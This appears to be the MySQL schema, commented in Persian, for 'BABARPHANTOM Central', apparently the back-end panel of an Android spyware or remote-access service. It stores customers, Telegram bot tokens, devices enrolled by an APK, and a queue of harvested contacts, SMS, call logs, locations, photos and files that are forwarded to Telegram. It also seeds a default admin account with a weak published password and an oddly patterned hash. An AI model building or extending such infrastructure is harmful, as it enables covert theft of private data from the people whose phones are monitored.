-- BABARPHANTOM Central — MySQL schema
-- Charset: utf8mb4, Engine: InnoDB
-- Run: mysql -u babar_user -p babar_central < private/database/schema.sql

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS=0;

-- customers: هر مشتری حساب مستقل
CREATE TABLE IF NOT EXISTS `customers` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `uuid` CHAR(36) NOT NULL COMMENT 'شناسهٔ عمومی مشتری (برای API)',
  `email` VARCHAR(255) NOT NULL,
  `password_hash` VARCHAR(255) NOT NULL,
  `name` VARCHAR(255) NOT NULL DEFAULT '',
  `status` ENUM('active','blocked','pending') NOT NULL DEFAULT 'active',
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_uuid` (`uuid`),
  UNIQUE KEY `uniq_email` (`email`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- telegram_bots: هر مشتری می‌تواند چند ربات داشته باشد (معمولاً یکی)
CREATE TABLE IF NOT EXISTS `telegram_bots` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `customer_id` INT UNSIGNED NOT NULL,
  `bot_username` VARCHAR(255) DEFAULT NULL,
  `token_encrypted` TEXT NOT NULL COMMENT 'AES-256-GCM, base64',
  `token_nonce` VARCHAR(64) NOT NULL COMMENT 'GCM nonce, base64',
  `is_connected` TINYINT(1) NOT NULL DEFAULT 0,
  `last_checked_at` DATETIME DEFAULT NULL,
  `last_error` TEXT DEFAULT NULL,
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_customer` (`customer_id`),
  CONSTRAINT `fk_bots_customer` FOREIGN KEY (`customer_id`) REFERENCES `customers` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- devices: دستگاه‌های متصل هر مشتری (ایزوله با customer_id)
CREATE TABLE IF NOT EXISTS `devices` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `customer_id` INT UNSIGNED NOT NULL,
  `device_id` VARCHAR(128) NOT NULL COMMENT 'Android ANDROID_ID یا UUID تولیدشده توسط APK',
  `device_name` VARCHAR(255) DEFAULT NULL,
  `model` VARCHAR(255) DEFAULT NULL,
  `os_version` VARCHAR(64) DEFAULT NULL,
  `app_version` VARCHAR(64) DEFAULT NULL,
  `last_seen_at` DATETIME DEFAULT NULL,
  `is_active` TINYINT(1) NOT NULL DEFAULT 1,
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_customer_device` (`customer_id`, `device_id`),
  KEY `idx_customer` (`customer_id`),
  CONSTRAINT `fk_devices_customer` FOREIGN KEY (`customer_id`) REFERENCES `customers` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- device_data: صف داده‌های دریافتی از دستگاه (قبل از فوروارد به تلگرام یا ذخیره)
CREATE TABLE IF NOT EXISTS `device_data` (
  `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  `customer_id` INT UNSIGNED NOT NULL,
  `device_id` INT UNSIGNED NOT NULL COMMENT 'FK to devices.id',
  `data_type` VARCHAR(64) NOT NULL COMMENT 'contacts, sms, calllog, location, photo, file, etc.',
  `payload_json` JSON DEFAULT NULL COMMENT 'متادیتا (اختیاری)',
  `file_path` VARCHAR(512) DEFAULT NULL COMMENT 'مسیر فایل روی سرور (private/logs یا storage)',
  `is_forwarded` TINYINT(1) NOT NULL DEFAULT 0,
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_customer` (`customer_id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_type` (`data_type`),
  CONSTRAINT `fk_data_customer` FOREIGN KEY (`customer_id`) REFERENCES `customers` (`id`) ON DELETE CASCADE,
  CONSTRAINT `fk_data_device` FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- api_keys: کلیدهای API برای APK (هر مشتری یک یا چند کلید)
CREATE TABLE IF NOT EXISTS `api_keys` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `customer_id` INT UNSIGNED NOT NULL,
  `api_key` CHAR(64) NOT NULL COMMENT 'hex 32 bytes',
  `name` VARCHAR(255) DEFAULT 'default',
  `is_active` TINYINT(1) NOT NULL DEFAULT 1,
  `last_used_at` DATETIME DEFAULT NULL,
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_api_key` (`api_key`),
  KEY `idx_customer` (`customer_id`),
  CONSTRAINT `fk_keys_customer` FOREIGN KEY (`customer_id`) REFERENCES `customers` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- security_events: ثبت رویدادهای امنیتی
CREATE TABLE IF NOT EXISTS `security_events` (
  `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  `customer_id` INT UNSIGNED DEFAULT NULL,
  `event_type` VARCHAR(64) NOT NULL,
  `ip` VARCHAR(45) DEFAULT NULL,
  `user_agent` VARCHAR(512) DEFAULT NULL,
  `details` JSON DEFAULT NULL,
  `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_customer` (`customer_id`),
  KEY `idx_type` (`event_type`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- settings: تنظیمات سراسری پنل
CREATE TABLE IF NOT EXISTS `settings` (
  `k` VARCHAR(128) NOT NULL,
  `v` TEXT NOT NULL,
  `updated_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`k`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- rate_limits: برای محدودیت درخواست (یا می‌تواند Redis باشد)
CREATE TABLE IF NOT EXISTS `rate_limits` (
  `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  `identifier` VARCHAR(128) NOT NULL COMMENT 'IP یا api_key',
  `endpoint` VARCHAR(128) NOT NULL,
  `requests` INT UNSIGNED NOT NULL DEFAULT 1,
  `window_start` DATETIME NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_ident_endpoint_window` (`identifier`,`endpoint`,`window_start`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Seed default admin customer (password: Admin123! — حتماً عوض کنید)
INSERT INTO `customers` (`uuid`, `email`, `password_hash`, `name`, `status`)
VALUES (UUID(), 'admin@local', '$2y$12$LQv3c1yqBWVHxkd0LHAkCOYz6Tgx2jpu2aB.F0p4bD8v4a2b8v4a2b8', 'Administrator', 'active')
ON DUPLICATE KEY UPDATE email=email;

INSERT INTO `settings` (`k`, `v`) VALUES
('app_name', 'BABARPHANTOM Central'),
('maintenance', '0'),
('max_devices_per_customer', '50')
ON DUPLICATE KEY UPDATE k=k;
